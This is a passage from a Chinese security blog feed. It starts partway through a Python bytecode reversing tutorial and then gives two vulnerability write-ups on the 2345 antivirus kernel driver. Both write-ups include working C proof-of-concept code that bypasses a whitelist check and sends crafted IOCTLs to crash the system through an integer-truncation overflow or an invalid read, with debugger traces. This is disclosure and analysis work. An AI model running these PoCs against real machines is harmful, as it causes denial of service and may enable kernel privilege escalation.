(i)</span><br><span class="line">            24 LOAD_CONST               3 (1)</span><br><span class="line">            27 INPLACE_ADD                     </span><br><span class="line">            28 STORE_FAST               0 (i) // i += 1</span><br><span class="line">            31 JUMP_ABSOLUTE            9    // 回到循环起点</span><br><span class="line">       &gt;&gt;   34 POP_BLOCK</span><br><span class="line">       &gt;&gt;   35 LOAD_CONST               0 (None)</span><br></pre></td></tr></table></figure> <p>对应python代码是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i = 0</span><br><span class="line">    while i &lt; 10:</span><br><span class="line">        i += 1</span><br></pre></td></tr></table></figure> <h3 id="for-in结构"><a href="#for-in结构" class="headerlink" title="for in结构"></a>for in结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    238 LOAD_FAST                3 (sieve)#sieve是个list</span><br><span class="line">    241 GET_ITER                    //开始迭代sieve</span><br><span class="line">&gt;&gt;  242 FOR_ITER                24 (to 269) //继续iter下一个x</span><br><span class="line">    245 STORE_FAST               4 (x)</span><br><span class="line">    ...</span><br><span class="line">    266 JUMP_ABSOLUTE          242 //循环</span><br></pre></td></tr></table></figure> <p>这是典型的for+in结构，转为python代码就是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for x in sieve:</span><br></pre></td></tr></table></figure> <h2 id="0x5-if"><a href="#0x5-if" class="headerlink" title="0x5.if"></a>0x5.if</h2><p><code>POP_JUMP_IF_FALSE</code>和<code>JUMP_FORWARD</code>一般用于分支判断跳转。<code>POP_JUMP_IF_FALSE</code>表示条件结果为<code>FALSE</code>就跳转到目标偏移指令。<code>JUMP_FORWARD</code>直接跳转到目标偏移指令。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">23           0 LOAD_CONST               1 (0)</span><br><span class="line">             3 STORE_FAST               0 (i) //i=0</span><br><span class="line">24           6 LOAD_FAST                0 (i)</span><br><span class="line">             9 LOAD_CONST               2 (5)</span><br><span class="line">            12 COMPARE_OP               0 (&lt;)</span><br><span class="line">            15 POP_JUMP_IF_FALSE       26</span><br><span class="line"></span><br><span class="line">25          18 LOAD_CONST               3 (&apos;i &lt; 5&apos;)</span><br><span class="line">            21 PRINT_ITEM</span><br><span class="line">            22 PRINT_NEWLINE</span><br><span class="line">            23 JUMP_FORWARD            25 (to 51)</span><br><span class="line"></span><br><span class="line">26     &gt;&gt;   26 LOAD_FAST                0 (i)</span><br><span class="line">            29 LOAD_CONST               2 (5)</span><br><span class="line">            32 COMPARE_OP               4 (&gt;)</span><br><span class="line">            35 POP_JUMP_IF_FALSE       46</span><br><span class="line"></span><br><span class="line">27          38 LOAD_CONST               4 (&apos;i &gt; 5&apos;)</span><br><span class="line">            41 PRINT_ITEM</span><br><span class="line">            42 PRINT_NEWLINE</span><br><span class="line">            43 JUMP_FORWARD             5 (to 51)</span><br><span class="line"></span><br><span class="line">29     &gt;&gt;   46 LOAD_CONST               5 (&apos;i = 5&apos;)</span><br><span class="line">            49 PRINT_ITEM</span><br><span class="line">            50 PRINT_NEWLINE</span><br><span class="line">       &gt;&gt;   51 LOAD_CONST               0 (None)</span><br></pre></td></tr></table></figure> <p>转为python代码是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i = 0</span><br><span class="line">if i &lt; 5:</span><br><span class="line">    print &apos;i &lt; 5&apos;</span><br><span class="line">elif i &gt; 5:</span><br><span class="line">    print &apos;i &gt; 5&apos;</span><br><span class="line">else:</span><br><span class="line">    print &apos;i = 5&apos;</span><br></pre></td></tr></table></figure> <h2 id="0x6-分辨函数"><a href="#0x6-分辨函数" class="headerlink" title="0x6.分辨函数"></a>0x6.分辨函数</h2><h3 id="1-函数范围"><a href="#1-函数范围" class="headerlink" title="1.函数范围"></a>1.函数范围</h3><p>前面介绍第二列表示指令在函数中的偏移地址，所以看到0就是函数开始，下一个0前一条指令就是函数结束位置，当然也可以通过<code>RETURN_VALUE</code>来确定函数结尾</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">54         0 LOAD_FAST                1 (plist) //函数开始</span><br><span class="line">           3 LOAD_CONST               0 (None)</span><br><span class="line">           6 COMPARE_OP               2 (==)</span><br><span class="line">           9 POP_JUMP_IF_FALSE        33</span><br><span class="line"></span><br><span class="line">55         ...</span><br><span class="line"></span><br><span class="line">67     &gt;&gt;  139 LOAD_FAST              2 (fs)</span><br><span class="line">           142 RETURN_VALUE</span><br><span class="line">70         0 LOAD_CONST               1 (&apos;FLAG&apos;) //另一个函数开始</span><br><span class="line">           3 STORE_FAST               0 (flag)</span><br></pre></td></tr></table></figure> <h3 id="2-函数调用"><a href="#2-函数调用" class="headerlink" title="2.函数调用"></a>2.函数调用</h3><p>函数调用类似于<code>push+call</code>的汇编结构，压栈参数从左到右依次压入（当然不是<code>push</code>，而是读取指令<code>LOAD_xxxx</code>来指定参数）。</p> <p>函数名一般通过<code>LOAD_GLOBAL</code>指令指定，如果是模块函数或者类成员函数通过<code>LOAD_GLOBAL</code>+<code>LOAD_ATTR</code>来指定。</p> <p>先指定要调用的函数，然后压参数，最后通过<code>CALL_FUNCTION</code>调用。</p> <p><code>CALL_FUNCTION</code>后面的值表示有几个参数。</p> <p>支持嵌套调用：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">6           0 LOAD_GLOBAL              0 (int) //int函数</span><br><span class="line">              3 LOAD_GLOBAL              1 (math)//math模块</span><br><span class="line">              6 LOAD_ATTR                2 (sqrt)//sqrt函数</span><br><span class="line">              9 LOAD_FAST                0 (n) //参数</span><br><span class="line">             12 CALL_FUNCTION            1</span><br><span class="line">             15 CALL_FUNCTION            1</span><br><span class="line">             18 STORE_FAST               2 (nroot)</span><br></pre></td></tr></table></figure> <p>这段<code>bytecode</code>转换成<code>python</code>代码就是</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nroot = int(math.sqrt(n)) //其中n是一个局部变量或者函数参数，具体看上下文</span><br></pre></td></tr></table></figure> <h2 id="0x7-其他指令"><a href="#0x7-其他指令" class="headerlink" title="0x7.其他指令"></a>0x7.其他指令</h2><p>其他常见指令，一看就明白，就不具体分析了，更多详细内容请看<a href="https://docs.python.org/2/library/dis.html" target="_blank" rel="noopener">官方文档</a>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">INPLACE_POWER()</span><br><span class="line">Implements in-place TOS = TOS1 ** TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_MULTIPLY()</span><br><span class="line">Implements in-place TOS = TOS1 * TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_DIVIDE()</span><br><span class="line">Implements in-place TOS = TOS1 / TOS when from __future__ import division is not in effect.</span><br><span class="line"></span><br><span class="line">INPLACE_FLOOR_DIVIDE()</span><br><span class="line">Implements in-place TOS = TOS1 // TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_TRUE_DIVIDE()</span><br><span class="line">Implements in-place TOS = TOS1 / TOS when from __future__ import division is in effect.</span><br><span class="line"></span><br><span class="line">INPLACE_MODULO()</span><br><span class="line">Implements in-place TOS = TOS1 % TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_ADD()</span><br><span class="line">Implements in-place TOS = TOS1 + TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_SUBTRACT()</span><br><span class="line">Implements in-place TOS = TOS1 - TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_LSHIFT()</span><br><span class="line">Implements in-place TOS = TOS1 &lt;&lt; TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_RSHIFT()</span><br><span class="line">Implements in-place TOS = TOS1 &gt;&gt; TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_AND()</span><br><span class="line">Implements in-place TOS = TOS1 &amp; TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_XOR()</span><br><span class="line">Implements in-place TOS = TOS1 ^ TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_OR()</span><br><span class="line">Implements in-place TOS = TOS1 | TOS.</span><br></pre></td></tr></table></figure> <p>基础运算还有一套对应的<code>BINARY_xxxx</code>指令，两者区别很简单。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i += 1 //使用INPLACE_xxx</span><br><span class="line">i = i + 1 //使用BINARY_xxxx</span><br></pre></td></tr></table></figure> <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol> <li><a href="https://docs.python.org/2/library/dis.html" target="_blank" rel="noopener">python dis官方文档</a></li> <li><a href="https://www.google.com/search?newwindow=1&amp;client=firefox-b-ab&amp;biw=1920&amp;bih=938&amp;ei=GUSGW4OeEor6wAOt8ZyQCw&amp;q=python+%E2%80%9CROT_THREE%E2%80%9D&amp;oq=python+%E2%80%9CROT_THREE%E2%80%9D&amp;gs_l=psy-ab.3..0i71k1l8.737846.738207.0.738259.3.3.0.0.0.0.0.0..0.0....0...1c.1.64.psy-ab..3.0.0....0.PcHujQY7ZAE" target="_blank" rel="noopener">google搜索dis指令</a></li> <li><a href="https://github.com/vstinner/bytecode" target="_blank" rel="noopener">https://github.com/vstinner/bytecode</a></li> <li><a href="https://blog.hakril.net/articles/2-understanding-python-execution-tracer.html" target="_blank" rel="noopener">https://blog.hakril.net/articles/2-understanding-python-execution-tracer.html</a></li> <li><a href="https://qingyunha.github.io/taotao/" target="_blank" rel="noopener">A Python Interpreter Written in Python</a></li> <li><a href="https://blog.csdn.net/qs9816/article/details/51661659" target="_blank" rel="noopener">https://blog.csdn.net/qs9816/article/details/51661659</a></li> <li><a href="https://github.com/Mysterie/uncompyle2" target="_blank" rel="noopener">https://github.com/Mysterie/uncompyle2</a></li> </ol> <p>转载请注明出处：<a href="https://anhkgg.github.io/python-bytecode/">https://anhkgg.github.io/python-bytecode/</a></p> ]]></content>          <summary type="html">            &lt;h2 id=&quot;0x1-前言&quot;&gt;&lt;a href=&quot;#0x1-前言&quot; class=&quot;headerlink&quot; title=&quot;0x1.前言&quot;&gt;&lt;/a&gt;0x1.前言&lt;/h2&gt;&lt;blockquote&gt; &lt;p&gt;Python 代码先被编译为字节码后，再由Python虚拟机来执行字节码， Python的字节码是一种类似汇编指令的中间语言， 一个Python语句会对应若干字节码指令，虚拟机一条一条执行字节码指令， 从而完成程序执行。&lt;br&gt;Python dis 模块支持对Python代码进行反汇编， 生成字节码指令。&lt;/p&gt; &lt;/blockquote&gt;          </summary>            <category term="CTF" scheme="https://anhkgg.github.io/categories/CTF/"/>                 <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>            <category term="CTF" scheme="https://anhkgg.github.io/tags/CTF/"/>            <category term="逆向" scheme="https://anhkgg.github.io/tags/%E9%80%86%E5%90%91/"/>        </entry>      <entry>     <title>2345内核拒绝服务漏洞（3） - WORD的锅</title>     <link href="https://anhkgg.github.io/vul-2345-3/"/>     <id>https://anhkgg.github.io/vul-2345-3/</id>     <published>2018-07-13T04:25:33.000Z</published>     <updated>2018-07-13T04:26:58.032Z</updated>          <content type="html"><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><ul> <li>软件网址：<a href="http://safe.2345.cc/" target="_blank" rel="noopener">http://safe.2345.cc/</a></li> <li>版本：v3.7 X64</li> </ul> <p>2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x0022204C)接口处理中，对输入数据校验不严格，精心构造的数据可导致在处理过程中内存拷贝时溢出，然后bsod拒绝服务，甚至可内核提权。</p> <a id="more"></a> <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在<code>IRP_MJ_DEVICE_CONTROL</code>处理函数中，对<code>0x22204C</code>接口进行处理时，有一段拷贝字符串的操作如下所示：</p> <p><img src="http://wx2.sinaimg.cn/mw690/006mu4nKly1ft5604o35nj30jn04k0so.jpg" alt="img"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct _ioctl_buf</span><br><span class="line">&#123;</span><br><span class="line">  WORD len;</span><br><span class="line">  WORD len_;</span><br><span class="line">  DWORD unk2;</span><br><span class="line">  _ioctl_buf_str *ptr;</span><br><span class="line">&#125;;</span><br><span class="line">struct _ioctl_buf_str</span><br><span class="line">&#123;</span><br><span class="line">  wchar_t buf[1];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure> <p><code>a2</code>是一个<code>_ioctl_buf</code>结构（由应用层输入构造而成），<code>len2</code>是输入的另一个字符串的长度，通过<code>a2-&gt;len</code>（2字节）和<code>len2</code>（2字节）计算得到<code>len1</code>，关键在于<code>len1</code>是也一个<code>WORD</code>变量，只有2字节，所以当<code>a2-&gt;len+len2</code>的大小超过<code>WORD</code>溢出之后，会被截断成<code>WORD</code>，截断后的值赋给<code>len1</code>，此时就可能导致<code>len1</code>的值反而小于<code>a2-&gt;len</code>。比如：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xa3d0 + 0xb4f0 = 0x158C0 =&gt;截断=&gt; 0x58C0</span><br><span class="line">0x58C0 &lt; 0xa3d0</span><br></pre></td></tr></table></figure> <p>接着根据<code>len1</code>分配内存<code>p</code>，<code>memmove</code>拷贝<code>a2-&gt;ptr</code>内容到<code>p</code>中，长度按<code>a2-&gt;len</code>，问题就来了，<code>a2-len</code>大于<code>len1</code>时，就会导致拷贝溢出，<code>bsod</code>（写溢出，可控制内容，可以做更多的利用了，这里我不擅长了）。</p> <p>好了，漏洞成因这里就分析完了。</p> <p>下面看一下<code>poc</code>：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">int poc()</span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line"> DWORD BytesReturned = 0;</span><br><span class="line"></span><br><span class="line"> HANDLE h = OpenDevice(&quot;\\\\.\\2345BdPcSafe&quot;);</span><br><span class="line"> if (h == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">  return 1;</span><br><span class="line"> &#125;</span><br><span class="line">    //过白名单检查</span><br><span class="line"> if (!BypassChk(h)) &#123;</span><br><span class="line">  return 1;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">//BSOD</span><br><span class="line"> DWORD ctlcode = 0x22204C;</span><br><span class="line">#pragma pack(push, 1)</span><br><span class="line"> struct _ioctl_buf_in</span><br><span class="line"> &#123;</span><br><span class="line">  DWORD unk1;</span><br><span class="line">  DWORD unk2;//4</span><br><span class="line">  DWORD offset1;//8 =0x18</span><br><span class="line">  DWORD offset2;//c =A3E8</span><br><span class="line">  DWORD offset3;//10</span><br><span class="line">  DWORD unk3;//14</span><br><span class="line">  char buf1[0xa3d0];//18</span><br><span class="line">  char buf2[0xb4f0];//18+a3d0 </span><br><span class="line"> &#125;; //0x158D8</span><br><span class="line">#pragma pack(pop)</span><br><span class="line"></span><br><span class="line"> _ioctl_buf_in buff = &#123; 0 &#125;;</span><br><span class="line"> buff.unk1 = 4;</span><br><span class="line"> buff.unk3 = 4;</span><br><span class="line"> buff.offset1 = 0x18;</span><br><span class="line"> buff.offset2 = (char*)&amp;buff.buf2 - (char*)&amp;buff;</span><br><span class="line"> buff.offset3 = 0;</span><br><span class="line"> memset(buff.buf1, 0x41, 0xa3d0);</span><br><span class="line"> memset(buff.buf2, 0x41, 0xb4f0);</span><br><span class="line"></span><br><span class="line"> if(!DeviceIoControl(h, ctlcode, &amp;buff, sizeof(_ioctl_buf_in), &amp;buff, 0, &amp;BytesReturned, NULL)) &#123;</span><br><span class="line">  printf(&quot;[-] DeviceIoControl %x error: %d\n&quot;, ctlcode, GetLastError());</span><br><span class="line"> &#125;</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>其中<code>buff.buf1</code>和<code>buff.buf2</code>的长度<code>0xa3d0 + 0xb4f0 = 0x158c0</code>（截断）就是<code>a2-&gt;len</code>(<code>0x58c0</code>)，<code>buff.buf2</code>的长度<code>b4f0</code>就是<code>len2</code>。</p> <p>我们在调试中看一下计算结果，可以清晰看到<code>len1=0xdb2 &lt; 0x58c0(a2-&gt;len)</code>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; p</span><br><span class="line">2345BdPcSafe+0x561c:</span><br><span class="line">fffff880`0540561c 660307          add     ax,word ptr [rdi]</span><br><span class="line">0: kd&gt; r rdi</span><br><span class="line">rdi=fffffa8026539658</span><br><span class="line">0: kd&gt; dw fffffa8026539658 l1</span><br><span class="line">fffffa80`26539658  58c0</span><br><span class="line">//a2-&gt;len = 0x58c0</span><br><span class="line">0: kd&gt; p</span><br><span class="line">2345BdPcSafe+0x561f:</span><br><span class="line">fffff880`0540561f 664103c1        add     ax,r9w</span><br><span class="line">0: kd&gt; r rax</span><br><span class="line">rax=00000000000058c2</span><br><span class="line">//len2 = 0xb4f0</span><br><span class="line">0: kd&gt; r r9</span><br><span class="line">r9=000000000000b4f0</span><br><span class="line">0: kd&gt; p</span><br><span class="line">2345BdPcSafe+0x5623:</span><br><span class="line">fffff880`05405623 0fb7d0          movzx   edx,ax</span><br><span class="line">0: kd&gt; r rax</span><br><span class="line">rax=0000000000000db2</span><br><span class="line">//len1 = 0xdb2</span><br><span class="line">0: kd&gt; p</span><br><span class="line">2345BdPcSafe+0x562a:</span><br><span class="line">fffff880`0540562a ff15b80e0300    call    qword ptr [2345BdPcSafe+0x364e8 (fffff880`054364e8)]</span><br><span class="line">0: kd&gt; dq fffff880`054364e8 l1</span><br><span class="line">fffff880`054364e8  fffff800`03ff70e0</span><br><span class="line">0: kd&gt; u fffff800`03ff70e0</span><br><span class="line">nt!ExAllocatePoolWithTag:</span><br><span class="line">fffff800`03ff70e0 fff5            push    rbp</span><br><span class="line">0: kd&gt; r rcx;r rdx;r r8</span><br><span class="line">rcx=0000000000000001</span><br><span class="line">rdx=0000000000000db2</span><br><span class="line">r8=0000000035343332</span><br><span class="line">//参数：p = ExAllocatePoolWithTag(1, 0xdb2, 0x35343332);</span><br></pre></td></tr></table></figure> <h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这个漏洞主要是对输入参数结构体的长度字段校验不够严谨，导致变量溢出截断出现意外的大小结果导致了漏洞的产生。</p> <p>该系列后续会继续分析其他原因引起的漏洞，如有兴趣，敬请期待！</p> <p>转载请注明出处：<a href="https://anhkgg.github.io/vul-2345-3/">https://anhkgg.github.io/vul-2345-3/</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h1&gt;&lt;ul&gt; &lt;li&gt;软件网址：&lt;a href=&quot;http://safe.2345.cc/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://safe.2345.cc/&lt;/a&gt;&lt;/li&gt; &lt;li&gt;版本：v3.7 X64&lt;/li&gt; &lt;/ul&gt; &lt;p&gt;2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x0022204C)接口处理中，对输入数据校验不严格，精心构造的数据可导致在处理过程中内存拷贝时溢出，然后bsod拒绝服务，甚至可内核提权。&lt;/p&gt;          </summary>            <category term="vul" scheme="https://anhkgg.github.io/categories/vul/"/>                 <category term="vul" scheme="https://anhkgg.github.io/tags/vul/"/>            <category term="exploit" scheme="https://anhkgg.github.io/tags/exploit/"/>            <category term="fuzz" scheme="https://anhkgg.github.io/tags/fuzz/"/>        </entry>      <entry>     <title>2345内核拒绝服务漏洞（2）</title>     <link href="https://anhkgg.github.io/vul-2345-2/"/>     <id>https://anhkgg.github.io/vul-2345-2/</id>     <published>2018-07-08T03:15:49.000Z</published>     <updated>2018-07-08T03:18:23.919Z</updated>          <content type="html"><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><ul> <li>软件网址：<a href="http://safe.2345.cc/" target="_blank" rel="noopener">http://safe.2345.cc/</a></li> <li>版本：v3.7 X64</li> </ul> <p>2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x002220E4)接口处理中，对输入数据校验不严格，可构造数据中包含非法地址导致访问违例，然后bsod拒绝服务。</p> <a id="more"></a> <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在<code>IRP_MJ_DEVICE_CONTROL</code>处理函数中，对<code>0x2220E4</code>接口进行处理时如下所示：</p> <p><img src="http://wx1.sinaimg.cn/mw690/006mu4nKly1ft28yb8ym6j30mu03p747.jpg" alt="img"></p> <p><code>InputBuf</code>是应用层传入的输入缓存内容，校验<code>InputBuf</code>是否为空，长度是否超过8字节，然后通过<code>MmIsAddressValid</code>验证地址是否合法，合法后通过偏移16访问该内存内容是否等于标记<code>li7p</code>。</p> <p>问题就出在这里，<code>MmIsAddressValid</code>并不能验证一个内存某范围内是否可读可写，仅仅只能验证该地址读写是否会触发一个页错误。</p> <p>所以我们就可以构造一个可通过<code>MmIsAddressValid</code>验证并且地址16偏移不可读的内存作为输入，造成bsod。</p> <p>看下面的poc代码，通过<code>VirtualAlloc</code>分配一个页大小的内存，可读可写，然后计算页地址尾地址-4作为输入缓存的ptr，这样<code>MmIsAddressValid</code>可通过校验，再内核读取ptr+16偏移时地址已经超过该页内存范围，不可访问，导致bsod。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">int poc()</span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line"> DWORD BytesReturned = 0;</span><br><span class="line"></span><br><span class="line"> HANDLE h = OpenDevice(&quot;\\\\.\\2345BdPcSafe&quot;);</span><br><span class="line"> if (h == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">  return 1;</span><br><span class="line"> &#125;</span><br><span class="line">    //过白名单检查</span><br><span class="line"> if (!BypassChk(h)) &#123;</span><br><span class="line">  return 1;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> //BSOD</span><br><span class="line"> DWORD ctlcode = 0x2220E4;</span><br><span class="line">#pragma pack(push,1)</span><br><span class="line"> struct _ioctl_buf_in</span><br><span class="line"> &#123;</span><br><span class="line">   __int64 ptr;</span><br><span class="line"> &#125;;</span><br><span class="line">#pragma pack(pop)</span><br><span class="line"> _ioctl_buf_in buff = &#123; 0 &#125;;</span><br><span class="line">    </span><br><span class="line">    //分配一个页，可读可写，将该页地址尾地址-4作为输入缓存的ptr</span><br><span class="line">    //然后读取+16偏移时地址已经越过该页内存范围，不可访问，bsod</span><br><span class="line"> PVOID ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"> memset(ptr, 0x41, 0x1000);//</span><br><span class="line"> buff.ptr = (__int64)ptr + 0x1000 - 0x4;</span><br><span class="line"></span><br><span class="line"> if(!DeviceIoControl(h, ctlcode, &amp;buff, sizeof(_ioctl_buf_in), &amp;buff, sizeof(_ioctl_buf_in), &amp;BytesReturned, NULL)) &#123;</span><br><span class="line">  printf(&quot;[-] DeviceIoControl %x error: %d\n&quot;, ctlcode, GetLastError());</span><br><span class="line"> &#125;</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>看看内存更加清晰，<code>buff</code>地址是<code>003efea0</code>，<code>buff.ptr</code>的值是<code>00030ffc</code>，可以清楚看到<code>00030ffc</code>+16偏移处肯定是不可读的了。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0: kd:x86&gt; dd 003efe3c </span><br><span class="line">00000000`003efe3c  003efe68 75db3237 00000030 002220e4</span><br><span class="line">00000000`003efe4c  003efea0 00000008 003efea0 00000008</span><br><span class="line">0: kd:x86&gt; dd 003efea0 </span><br><span class="line">00000000`003efea0  00030ffc 00000000 01234808 003efef8</span><br><span class="line">0: kd:x86&gt; dd 00030ffc </span><br><span class="line">00000000`00030ffc  41414141 ???????? ???????? ????????</span><br><span class="line">00000000`0003100c  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure> <h1 id="结语"><a href="#结语" class="headerlink" 